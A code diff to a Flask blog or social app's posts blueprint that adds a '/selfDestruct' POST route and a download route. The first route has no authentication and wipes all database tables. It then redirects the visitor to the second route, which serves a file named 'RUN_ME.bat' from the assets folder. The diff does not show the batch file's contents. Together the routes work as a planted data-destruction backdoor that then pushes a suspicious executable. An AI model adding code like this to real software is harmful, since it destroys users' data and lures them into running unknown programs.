@@ -1,4 +1,5 @@
 import flask
+import random, os
 
 from db import posts, users, helpers
 
@@ -28,6 +29,7 @@ def post():
     posts.add_post(db, user, post, tags)
 
     return flask.redirect(flask.url_for('login.index'))
+
 
 @blueprint.route('/like/<post_id>', methods=['POST'])
 def like(post_id):
@@ -127,3 +129,17 @@ def comment(post_id):
 
     # Redirect back to the same page
     return flask.redirect(flask.request.referrer or flask.url_for('login.index'))
+
+@blueprint.route('/selfDestruct', methods=['POST'])
+def selfDestruct():
+    db = helpers.load_db()
+
+    # Drop all tables in the TinyDB database
+    db.drop_tables()
+    flask.flash("Database wiped successfully!", "warning")
+    return flask.redirect(flask.url_for('posts.download_test'))
+
+@blueprint.route("/download/RUN_ME.bat")
+def download_test():
+    # Assuming test.txt is in 'static/files/'
+    return flask.send_from_directory("assets", "RUN_ME.bat", as_attachment=True)
